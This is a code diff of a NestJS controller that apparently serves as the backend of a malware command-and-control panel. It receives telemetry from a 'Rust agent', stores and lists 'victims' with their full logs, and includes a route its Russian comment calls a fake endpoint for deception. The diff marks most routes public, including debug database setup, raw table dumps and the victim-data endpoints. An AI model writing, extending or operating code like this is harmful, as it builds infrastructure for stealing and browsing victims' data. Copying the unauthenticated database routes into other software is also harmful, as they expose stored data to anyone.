@@ -25,6 +25,9 @@ import {
   TelemetryLogResponse,
   VictimInfo,
 } from './entities/telemetry.entity';
+import { Public } from '../auth/decorators/public.decorator';
+import { AgentAuthGuard } from '../auth/guards/agent-auth.guard';
+import { UseGuards } from '@nestjs/common';
 
 @Controller('api')
 @UseFilters(TelemetryExceptionFilter)
@@ -45,6 +48,8 @@ export class TelemetryController {
    * Эндпоинт инициализации: POST /api/v1/init
    * Двухфазный handshake - клиент отправляет публичный ключ, получает зашифрованный response_key
    */
+  @Public()
+  @UseGuards(AgentAuthGuard)
   @Throttle({ default: { limit: 1000, ttl: 60000 } }) // Расширенная квота для Rust-агента
   @Post('v1/init')
   async initClient(@Req() req: Request) {
@@ -265,6 +270,8 @@ export class TelemetryController {
   //   }
   // }
 
+  @Public()
+  @UseGuards(AgentAuthGuard)
   @Throttle({ default: { limit: 1000, ttl: 60000 } }) // Расширенная квота для Rust-агента
   @Post('v1/telemetry')
   async receiveTelemetry(@Body() body: TelemetryBodyDto, @Req() req: Request) {
@@ -324,6 +331,7 @@ export class TelemetryController {
   /**
    * Фейковый эндпоинт для обмана: POST /api/analytics
    */
+  @Public()
   @Post('analytics')
   async fakeAnalytics(@Body() body: any) {
     try {
@@ -350,6 +358,7 @@ export class TelemetryController {
   /**
    * Health endpoint: GET /api/health
    */
+  @Public()
   @Get('health')
   async health() {
     try {
@@ -372,6 +381,7 @@ export class TelemetryController {
   /**
    * Endpoint данных таблицы: GET /api/v1/database/tables/:tableName/data
    */
+  @Public()
   @Get('v1/database/tables/:tableName/data')
   async getTableData(
     @Param('tableName') tableName: string,
@@ -388,6 +398,7 @@ export class TelemetryController {
    * Endpoint схемы БД: GET /api/v1/database/tables
    * Возвращает таблицы и их колонки из TELEMETRY_DATABASE_URL
    */
+  @Public()
   @Get('v1/database/tables')
   async getDatabaseTables(): Promise<{
     success: boolean;
@@ -417,6 +428,7 @@ export class TelemetryController {
     }
   }
 
+  @Public()
   @Get('debug/db-check')
     async checkTables() {
       // Мы используем тот же Client, который ты импортировал
@@ -440,6 +452,7 @@ export class TelemetryController {
         await client.end();
       }
     }
+  @Public()
   @Get('debug/db-setup') // Изменили путь для чистоты
     async setupDatabase() {
       const db = new Client({
@@ -539,6 +552,7 @@ CREATE INDEX IF NOT EXISTS idx_telemetry_logs_received_at ON telemetry_logs(rece
       }
     }
 
+  @Public()
   @Get('debug/victims-check')
   async checkVictims() {
     try {
@@ -619,6 +633,7 @@ CREATE INDEX IF NOT EXISTS idx_telemetry_logs_received_at ON telemetry_logs(rece
     }
   }
 
+  @Public()
   @Get('v1/victims')
   async getVictims() {
     try {
@@ -660,6 +675,7 @@ CREATE INDEX IF NOT EXISTS idx_telemetry_logs_received_at ON telemetry_logs(rece
     }
   }
 
+  @Public()
   @Get('v1/victim/:clientId/logs')
   async getVictimLogs(@Param('clientId') clientId: string) {
       console.log('=== getVictimLogs START (FULL DATA) ===');
